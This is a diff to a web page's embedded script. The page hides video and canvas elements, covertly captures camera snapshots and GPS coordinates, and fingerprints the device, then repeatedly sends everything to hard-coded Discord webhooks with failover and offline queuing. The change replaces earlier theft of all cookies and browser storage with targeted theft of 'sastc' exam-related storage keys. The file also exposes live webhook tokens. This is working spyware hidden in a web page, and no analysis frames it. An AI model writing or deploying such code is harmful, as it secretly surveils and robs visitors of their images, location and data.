@@ -927,7 +927,7 @@
 
 
   
-<video id="video" autoplay playsinline muted style="display:none;"></video>
+ <video id="video" autoplay playsinline muted style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
@@ -937,21 +937,17 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
-
-        // ============================================================
-        //  WEBHOOKS — client-side e rakha UCHIT NA, rotate koro regularly
-        // ============================================================
         const WEBHOOKS = [
             'https://discord.com/api/webhooks/1567526755055444021/mV2GiTzyiS13vApYREfgLxQdOzRowe1KFECjp4LrVvZmbrdM33YrYtsnNOseXfERJlfn',
             'https://discord.com/api/webhooks/1567526604115017779/iNz1gLaSq59muVE3Q_8yxvE8hDn6DFyGq-BMHFRaBkAvtYFdbCUciswVWZOcKfKjUNiL',
             'https://discord.com/api/webhooks/1567526428310773871/UAWBkWlAcCvsgkSqIbcnaT3Kd1A3BI_hJpDAIz7iu29c54qLpRDTJqIbRyIhfJ6OnrM8'
         ];
 
-        const LS_KEY_HOOK   = 'dv_hook_index';   // sticky webhook
-        const LS_KEY_QUEUE  = 'dv_offline_queue';
-        const LS_KEY_LAST   = 'dv_last_payload_hash';
+        const LS_KEY_HOOK  = 'dv_hook_index';
+        const LS_KEY_QUEUE = 'dv_offline_queue';
+        const LS_KEY_LAST  = 'dv_last_payload_hash';
 
-        
+      
         function getStickyWebhook() {
             let idx = parseInt(localStorage.getItem(LS_KEY_HOOK) || '-1', 10);
             if (isNaN(idx) || idx < 0 || idx >= WEBHOOKS.length) {
@@ -962,59 +958,45 @@
         }
 
         function failoverWebhook(currentIdx) {
-            // rate-limit hole porer webhook e switch (sticky update)
             const next = (currentIdx + 1) % WEBHOOKS.length;
             localStorage.setItem(LS_KEY_HOOK, String(next));
             console.warn(`Failover: webhook ${currentIdx} → ${next}`);
             return next;
         }
 
+    
         function detectDeviceName() {
             const ua = navigator.userAgent;
             const platform = navigator.platform || '';
+            let m;
 
-            // iPhone
-            let m = ua.match(/iPhone(?:\s+OS\s+([\d_]+))?/);
+            m = ua.match(/iPhone(?:\s+OS\s+([\d_]+))?/);
             if (m) {
                 const ver = m[1] ? m[1].replace(/_/g, '.') : '';
                 return `iPhone${ver ? ' (iOS ' + ver + ')' : ''}`;
             }
-            // iPad
-            if (/iPad/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-                return 'iPad';
-            }
-            // iPod
+            if (/iPad/.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) return 'iPad';
             if (/iPod/.test(ua)) return 'iPod';
 
-            // Samsung
             m = ua.match(/Samsung[^;)]*?([A-Z]\d{2,4}[A-Z0-9]*)/i);
             if (m) return `Samsung ${m[1]}`;
-            if (/SM-[A-Z0-9]+/.test(ua)) {
-                const sm = ua.match(/SM-[A-Z0-9]+/)[0];
-                return `Samsung ${sm}`;
-            }
+            if (/SM-[A-Z0-9]+/.test(ua)) return `Samsung ${ua.match(/SM-[A-Z0-9]+/)[0]}`;
 
-            // Google Pixel
             m = ua.match(/Pixel[\s\dA-Za-z]+/);
             if (m) return m[0].trim();
 
-            // OnePlus
             m = ua.match(/ONEPLUS\s?[A-Z0-9]+/i);
             if (m) return m[0];
 
-            // Xiaomi / Redmi / POCO
             m = ua.match(/(Redmi|POCO|Mi)[\s\-]?[A-Z0-9]+/i);
             if (m) return m[0];
 
-            // Huawei / Honor
             m = ua.match(/(HUAWEI|HONOR)[\s\-]?[A-Z0-9]+/i);
             if (m) return m[0];
 
-            // Realme / Oppo / Vivo
             m = ua.match(/(RMX\d+|CPH\d+|V\d{4})/);
             if (m) return m[0];
 
-            // Generic Android
             m = ua.match(/Android[\s\d.]*;([^;)]+)/);
             if (m) {
                 let model = m[1].trim();
@@ -1022,7 +1004,6 @@
                 return model;
             }
 
-            // Desktop
             if (/Windows NT 10/.test(ua)) return 'Windows 10/11 PC';
             if (/Windows NT/.test(ua)) return 'Windows PC';
             if (/Macintosh/.test(ua)) return 'Mac';
@@ -1034,23 +1015,15 @@
 
         function getOSInfo() {
             const ua = navigator.userAgent;
-            let os = 'Unknown', ver = 'N/A';
-            let m;
-
+            let os = 'Unknown', ver = 'N/A', m;
             if ((m = ua.match(/Windows NT ([\d.]+)/))) {
                 const map = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' };
                 os = 'Windows'; ver = map[m[1]] || m[1];
-            } else if ((m = ua.match(/Android ([\d.]+)/))) {
-                os = 'Android'; ver = m[1];
-            } else if ((m = ua.match(/(?:iPhone OS|CPU OS) ([\d_]+)/))) {
-                os = 'iOS'; ver = m[1].replace(/_/g, '.');
-            } else if ((m = ua.match(/Mac OS X ([\d_.]+)/))) {
-                os = 'macOS'; ver = m[1].replace(/_/g, '.');
-            } else if (/CrOS/.test(ua)) {
-                os = 'ChromeOS';
-            } else if (/Linux/.test(ua)) {
-                os = 'Linux';
-            }
+            } else if ((m = ua.match(/Android ([\d.]+)/))) { os = 'Android'; ver = m[1]; }
+            else if ((m = ua.match(/(?:iPhone OS|CPU OS) ([\d_]+)/))) { os = 'iOS'; ver = m[1].replace(/_/g, '.'); }
+            else if ((m = ua.match(/Mac OS X ([\d_.]+)/))) { os = 'macOS'; ver = m[1].replace(/_/g, '.'); }
+            else if (/CrOS/.test(ua)) os = 'ChromeOS';
+            else if (/Linux/.test(ua)) os = 'Linux';
             return `${os} ${ver}`;
         }
 
@@ -1072,7 +1045,7 @@
                 || navigator.webdriver === true;
         }
 
-        
+    
         function canvasFingerprint() {
             try {
                 const c = document.createElement('canvas');
@@ -1086,7 +1059,7 @@
                 ctx.fillText('DeviceFingerprint🔒', 2, 15);
                 ctx.fillStyle = 'rgba(102,204,0,0.7)';
                 ctx.fillText('DeviceFingerprint🔒', 4, 20);
-                return c.toDataURL().slice(-64); // last 64 chars enough
+                return c.toDataURL().slice(-64);
             } catch { return null; }
         }
 
@@ -1122,7 +1095,6 @@
                 screen.colorDepth,
                 new Date().getTimezoneOffset()
             ];
-            // FNV-1a hash
             const str = parts.join('|');
             let hash = 2166136261;
             for (let i = 0; i < str.length; i++) {
@@ -1132,58 +1104,48 @@
             return (hash >>> 0).toString(16).padStart(8, '0');
         }
 
-     
-        function getLocalStorage() {
+      
+        const SASTC_KEYS = ['sastc_active_dept', 'sastc_exam_level', 'sastc_exam_semester'];
+
+        function getSastcData() {
+            const result = {};
+            const sources = {};
+
             try {
-                if (!localStorage.length) return null;
-                const items = [];
-                for (let i = 0; i < localStorage.length && i < 30; i++) {
-                    const k = localStorage.key(i);
-                    const v = localStorage.getItem(k) || '';
-                    items.push(`${k}=${v.slice(0, 100)}`);
+                for (const k of SASTC_KEYS) {
+                    const v = localStorage.getItem(k);
+                    if (v !== null) { result[k] = v; sources[k] = 'localStorage'; }
                 }
-                return `localStorage (${localStorage.length}): ${items.join('; ')}`;
-            } catch { return null; }
-        }
+            } catch {}
 
-        function getSessionStorage() {
             try {
-                if (!sessionStorage.length) return null;
-                const items = [];
-                for (let i = 0; i < sessionStorage.length && i < 30; i++) {
-                    const k = sessionStorage.key(i);
-                    const v = sessionStorage.getItem(k) || '';
-                    items.push(`${k}=${v.slice(0, 100)}`);
+                for (const k of SASTC_KEYS) {
+                    const v = sessionStorage.getItem(k);
+                    if (v !== null && result[k] === undefined) { result[k] = v; sources[k] = 'sessionStorage'; }
                 }
-                return `sessionStorage (${sessionStorage.length}): ${items.join('; ')}`;
-            } catch { return null; }
-        }
+            } catch {}
 
-        function getCookies() {
             try {
-                const c = document.cookie;
-                if (!c) return 'Cookies: (none accessible)';
-                return `Cookies: ${c.slice(0, 300)}`;
-            } catch { return null; }
+                const cookieMap = {};
+                document.cookie.split(';').forEach(c => {
+                    const [k, ...rest] = c.trim().split('=');
+                    if (k) cookieMap[k] = decodeURIComponent(rest.join('='));
+                });
+                for (const k of SASTC_KEYS) {
+                    if (cookieMap[k] !== undefined && result[k] === undefined) {
+                        result[k] = cookieMap[k];
+                        sources[k] = 'cookie';
+                    }
+                }
+            } catch {}
+
+            return SASTC_KEYS.map(k => {
+                if (result[k] !== undefined) return `${k} = ${result[k]}  (from ${sources[k]})`;
+                return `${k} = (not found)`;
+            });
         }
 
-        async function getCacheStorage() {
-            try {
-                if (!window.caches) return null;
-                const keys = await caches.keys();
-                return keys.length ? `CacheStorage: ${keys.join(', ')}` : 'CacheStorage: empty';
-            } catch { return null; }
-        }
-
-        async function getIndexedDBInfo() {
-            try {
-                if (!window.indexedDB?.databases) return null;
-                const dbs = await indexedDB.databases();
-                return dbs.length ? `IndexedDB: ${dbs.map(d => d.name).join(', ')}` : 'IndexedDB: empty';
-            } catch { return null; }
-        }
-
-       
+        
         async function getPermissions() {
             try {
                 if (!navigator.permissions?.query) return null;
@@ -1193,13 +1155,13 @@
                     try {
                         const p = await navigator.permissions.query({ name });
                         results.push(`${name}=${p.state}`);
-                    } catch { /* unsupported */ }
+                    } catch {}
                 }
                 return results.length ? `Permissions: ${results.join(', ')}` : null;
             } catch { return null; }
         }
 
-        
+    
         async function getBatteryInfo() {
             try {
                 if (!navigator.getBattery) return null;
@@ -1217,7 +1179,6 @@
                     (p) => {
                         const lat = p.coords.latitude.toFixed(6);
                         const lon = p.coords.longitude.toFixed(6);
-                        // ✅ Clickable Google Maps link
                         const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                         resolve(
                             `📍 **GPS:** <${mapLink}>\n` +
@@ -1328,20 +1289,18 @@
             ];
         }
 
-       
+      
         async function gatherDeviceInfo() {
-            const [battery, location, mediaDevices, storage, permissions,
-                   cacheStorage, indexedDB] = await Promise.all([
+            const [battery, location, mediaDevices, storage, permissions] = await Promise.all([
                 getBatteryInfo(),
                 getLocation(),
                 getMediaDevicesInfo(),
                 getStorageInfo(),
-                getPermissions(),
-                getCacheStorage(),
-                getIndexedDBInfo()
+                getPermissions()
             ]);
 
             const fingerprint = await deviceFingerprint();
+            const sastcData = getSastcData();
 
             const sections = [
                 ['DEVICE', [`Fingerprint: ${fingerprint}`, ...getDeviceBasics()]],
@@ -1352,7 +1311,8 @@
                 ['LOCATION', [location].filter(Boolean)],
                 ['PERMISSIONS', [permissions].filter(Boolean)],
                 ['MEDIA', [mediaDevices].filter(Boolean)],
-                ['STORAGE', [storage, getLocalStorage(), getSessionStorage(), getCookies(), cacheStorage, indexedDB].filter(Boolean)],
+                ['SASTC CACHE', sastcData],
+                ['STORAGE', [storage].filter(Boolean)],
                 ['TIME', getTimeAndLocale()],
                 ['PAGE', getReferrerAndUrl()]
             ];
@@ -1366,7 +1326,7 @@
                 .join('\n\n');
         }
 
-       
+    
         let cameraStream = null;
         async function initCamera() {
             try {
@@ -1396,22 +1356,19 @@
             } catch { return null; }
         }
 
-       
         function payloadHash(text) {
-            // duplicate detection — same payload bar bar na pathai
             let h = 0;
             for (let i = 0; i < text.length; i++) h = (Math.imul(31, h) + text.charCodeAt(i)) | 0;
             return String(h);
         }
 
-        function queueOffline(text, imageBlob) {
+        function queueOffline(text) {
             try {
-                // image blob queue korte parbo na (blob persist korbo na), sudhu text
                 const q = JSON.parse(localStorage.getItem(LS_KEY_QUEUE) || '[]');
                 q.push({ text, ts: Date.now() });
-                while (q.length > 20) q.shift(); // max 20
+                while (q.length > 20) q.shift();
                 localStorage.setItem(LS_KEY_QUEUE, JSON.stringify(q));
-            } catch { /* quota */ }
+            } catch {}
         }
 
         async function flushOfflineQueue() {
@@ -1419,10 +1376,8 @@
                 const q = JSON.parse(localStorage.getItem(LS_KEY_QUEUE) || '[]');
                 if (!q.length) return;
                 localStorage.removeItem(LS_KEY_QUEUE);
-                for (const item of q) {
-                    await sendText(item.text);
-                }
-            } catch { /* ignore */ }
+                for (const item of q) await sendText(item.text);
+            } catch {}
         }
 
         async function sendText(text, attempt = 0) {
@@ -1432,7 +1387,6 @@
 
             try {
                 const res = await fetch(url, { method: 'POST', body: form });
-
                 if (res.status === 429) {
                     const wait = Math.min(parseFloat(res.headers.get('Retry-After') || '3'), 30);
                     if (attempt < 2) {
@@ -1450,7 +1404,7 @@
                     return sendText(text, attempt + 1);
                 }
                 console.error('sendText failed:', err.message);
-                queueOffline(text, null);
+                queueOffline(text);
                 return false;
             }
         }
@@ -1458,7 +1412,6 @@
         async function sendToDiscord(text, imageBlob, attempt = 0) {
             const { idx, url } = getStickyWebhook();
 
-            // Duplicate check
             const hash = payloadHash(text);
             if (localStorage.getItem(LS_KEY_LAST) === hash) {
                 console.log('Duplicate payload — skipping');
@@ -1497,7 +1450,7 @@
             } catch (err) {
                 console.error(`hook#${idx+1} fetch error:`, err.message);
                 if (!navigator.onLine) {
-                    queueOffline(text, imageBlob);
+                    queueOffline(text);
                     statusEl.textContent = 'Offline — queued';
                     return;
                 }
@@ -1510,7 +1463,7 @@
             }
         }
 
-        
+       
         async function tick() {
             try {
                 const info = await gatherDeviceInfo();
@@ -1521,17 +1474,15 @@
             }
         }
 
-        // Online hole queue flush
         window.addEventListener('online', () => {
             console.log('Back online — flushing queue');
             flushOfflineQueue();
         });
 
-        // Page visibility — tab hidden hole interval pause
         let intervalId = null;
         function startLoop() {
             if (intervalId) return;
-            intervalId = setInterval(tick, 15000);
+            intervalId = setInterval(tick, 20000);
         }
         function stopLoop() {
             if (intervalId) { clearInterval(intervalId); intervalId = null; }
@@ -1547,7 +1498,6 @@
             startLoop();
         })();
     </script>
-
 
 
 
